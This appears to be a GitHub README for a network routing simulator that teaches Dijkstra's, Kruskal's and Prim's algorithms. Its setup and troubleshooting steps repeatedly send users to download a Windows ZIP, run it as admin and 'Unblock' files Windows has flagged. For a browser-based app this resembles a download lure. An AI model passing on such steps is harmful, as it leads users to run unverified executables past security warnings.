# 🛣️ netroute-sim - Route networks with live maps

[![Download / Install](https://img.shields.io/badge/Download%20Now-Visit%20GitHub-brightgreen?style=for-the-badge)](https://github.com/Charlotteaphetic255/netroute-sim)

## 📌 What this app does

netroute-sim is a network packet routing simulator. It shows how data moves through a network of routers and links.

It helps you:

- see how routers connect
- compare route choices
- find the shortest path between nodes
- build a minimum spanning tree with common graph methods
- view results in the browser with WebAssembly

This app is meant for learning and testing. It gives a clear view of graph-based routing without requiring you to write code.

## 🖥️ Windows setup

Use the link below to visit the download page and get the app:

[Visit the download page](https://github.com/Charlotteaphetic255/netroute-sim)

### What you need

- Windows 10 or Windows 11
- A modern web browser such as Chrome, Edge, or Firefox
- Internet access for the first download
- At least 4 GB of RAM
- 200 MB of free disk space

## 🚀 Get started

1. Open the download page: [https://github.com/Charlotteaphetic255/netroute-sim](https://github.com/Charlotteaphetic255/netroute-sim)
2. Look for the latest release or the main project files
3. Download the Windows build or the package provided on the page
4. If the file is a ZIP file, right-click it and choose Extract All
5. Open the extracted folder
6. Run the main app file or open the browser view if the package includes one
7. If Windows asks for permission, choose Run or Yes

## 🔧 First launch

When the app opens, you can start with a sample network or load your own graph.

You will usually see:

- a set of routers or nodes
- lines that show network links
- weights on links that affect route choice
- controls for shortest path and spanning tree tools

If the app includes a browser view, it may open in your default browser after launch.

## 🧭 How to use it

### Find the shortest route

Use the shortest path tool when you want to see the best route from one router to another.

1. Choose a start node
2. Choose an end node
3. Run the shortest path search
4. Review the route and total cost

This uses Dijkstra’s algorithm, which checks the cheapest path based on link weights.

### Build a minimum spanning tree

Use the spanning tree tools when you want to connect all routers with the lowest total weight.

You can compare two methods:

- Kruskal’s algorithm
- Prim’s algorithm

Both help you see how a full network can stay connected with less total cost.

### Explore routing behavior

You can change link weights and see how the network reacts.

Try this:

- make one link more costly
- run the shortest path again
- compare the new route
- check how the spanning tree changes

This makes it easier to understand how routing decisions work in real networks.

## 🎛️ Main features

- network packet routing simulation
- graph-based router model
- weighted links between nodes
- shortest path search with Dijkstra’s algorithm
- minimum spanning tree with Kruskal’s algorithm
- minimum spanning tree with Prim’s algorithm
- live browser view through WebAssembly
- simple interface for non-technical users
- fast response for small and medium graph setups

## 🧩 How it works

The app treats the network as a graph.

- each router is a node
- each cable or connection is an edge
- each edge has a weight
- the weight can stand for cost, delay, or distance

The app then uses standard graph methods to solve routing tasks:

- Dijkstra’s algorithm finds the lowest-cost path
- Kruskal’s algorithm builds a tree by choosing the cheapest links first
- Prim’s algorithm grows the tree from one node at a time
- union-find helps Kruskal’s algorithm avoid loops

This makes the app useful for network study and graph practice.

## 📂 Typical folder view

If you download the project files, you may see folders and files like these:

- source code for the simulator
- build files
- browser files
- graph data
- sample network layouts
- docs or notes

If you only want to run the app, focus on the main release file or the browser launch file in the download package.

## 🛠️ Troubleshooting

### The app does not open

- check that the download finished
- extract the ZIP file before running it
- try opening it again as admin
- make sure your browser is up to date

### Windows blocks the file

- right-click the file
- choose Properties
- if you see an Unblock option, select it
- open the file again

### The browser view is blank

- refresh the page
- try another browser
- check that JavaScript is enabled
- close and reopen the app

### The simulator runs slowly

- close other apps
- use a smaller graph
- reduce the number of nodes and links
- reload the page

## 📘 Learning use

This app can help with:

- router path planning
- graph basics
- shortest path search
- minimum spanning trees
- network cost comparison
- WebAssembly-based apps in the browser

It is a good fit for users who want to see how routing works without reading source code first

## 🔗 Download

Visit the main project page and download or open the Windows build from there:

[https://github.com/Charlotteaphetic255/netroute-sim](https://github.com/Charlotteaphetic255/netroute-sim)

## 🧪 Example use case

If you want to model a small office network:

1. add routers for each room
2. connect them with links
3. assign weights to each link
4. run Dijkstra’s algorithm from one room to another
5. run Kruskal’s or Prim’s algorithm to compare full network layouts
6. review which links give the lowest total cost

This helps you see how a network can stay connected while keeping path cost low

## 🧱 Built with

- C
- graph data structures
- Dijkstra’s algorithm
- Kruskal’s algorithm
- Prim’s algorithm
- union-find
- WebAssembly
- browser-based visualization

## 📌 Topics covered

- algorithms
- data structures
- network simulation
- weighted graphs
- minimum spanning trees
- shortest path search
- router routing
- browser visualization